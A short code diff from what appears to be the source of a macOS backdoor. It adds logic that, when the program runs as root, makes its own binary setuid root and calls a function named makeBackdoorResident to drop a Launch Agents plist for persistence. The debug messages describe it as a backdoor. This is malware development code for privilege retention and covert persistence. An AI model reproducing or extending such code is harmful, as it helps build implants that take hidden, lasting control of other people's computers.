@@ -1697,7 +1697,6 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      
       return YES;
     }
   
@@ -2411,10 +2410,24 @@ static void computerWillShutdown(CFMachPortRef port,
   if (getuid() == 0)
     {
 #ifdef DEBUG_CORE
-      infoLog(@"Root executed us, we don't need him :)");
+      infoLog(@"Root executed us");
+      infoLog(@"Making binary root suid and dropping launch agents plist");
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
+      if ([self makeBackdoorResident] == NO)
+        {
+#ifdef DEBUG_CORE
+          errorLog(@"Error while dropping Launch Agents plist for SLI PLIST mode");
+#endif
+        }
+      else
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"Launch Agents plist dropped");
+#endif
+        }
+
       exit(0);
     }
 
